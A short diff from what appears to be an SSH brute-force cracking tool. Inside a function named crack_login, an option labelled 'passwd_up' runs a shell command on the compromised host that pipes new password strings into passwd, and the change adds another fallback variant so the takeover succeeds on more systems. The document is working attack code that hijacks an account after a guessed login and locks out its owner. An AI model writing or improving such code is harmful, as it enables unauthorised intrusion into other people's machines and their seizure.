@@ -426,7 +426,7 @@ def crack_login(host, port, username, password):
                   for line in rl:
                     log(f'{line}')
       if opts['passwd_up']:
-        diycmd=f"echo -e ''$$$$\\\\n$$$$''| passwd || echo -e ''{password}\\\\n$$$$\\\\n$$$$'' | passwd || echo ''{password}\\\\n$$$$\\\\n$$$$'' | passwd";
+        diycmd=f"echo -e ''$$$$\\\\n$$$$''| passwd || echo -e ''{password}\\\\n$$$$\\\\n$$$$'' | passwd || echo ''$$$$\\\\n$$$$'' | passwd || echo ''{password}\\\\n$$$$\\\\n$$$$'' | passwd";
         stdin, stdout, stderr = cli.exec_command(diycmd, timeout=2)
         log(f"passwd_up ssh command results for \'{diycmd}\'", 'good')
         for line in stdout.readlines():
